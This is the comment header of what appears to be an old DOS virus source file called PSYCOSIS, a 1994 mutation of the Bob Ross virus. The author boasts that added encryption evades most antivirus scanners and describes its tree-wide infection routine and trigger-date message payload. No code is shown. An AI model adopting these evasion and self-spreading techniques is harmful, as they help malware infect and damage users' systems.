; VirusName : PSYCOSIS
; Origin    : Sweden
; Author    : The Unforgiven
; Date      : 03/01/94

; This is yet another mutation of the Bob Ross virus, written by Dark
; Angel of Phalcon/Skism in September 1991. In my last version of this
; virus, I excluded the encryption, and included some destructive code
; instead. In this one, I added a new encryption, and thereby it went
; undetectable by most of the scanners. Yes, Scan/FindViru/MSAV/CPAV,
; can't find it. F-prot doesn't founds a shit, but Tbscan's most
; heuristics scanner says that it "probably" is infected with some
; unknown virus. The "standard" heuristic gets some flags, but not
; enough to say that it's infected. Therefor I'd like to claim that
; the scanners sucks!

; I had thought to change much more in the code, for example the
; spreading routine. This virus will search the whole tree for
; files to infect, and becomes therefor pretty slow, and easily
; detected. But hell, it spreads!, Hm, 3 files each run!..

; It also contains a resident printing part, which under some
; specific conditions will print some messages, in the top of the
; screen. If you're afraid that you are infected with this virus,
; just set the date to 0606 any year, and wait for some minutes. 
; If a sudden message shows up, delete your .COM file, which first
; character is an "&".
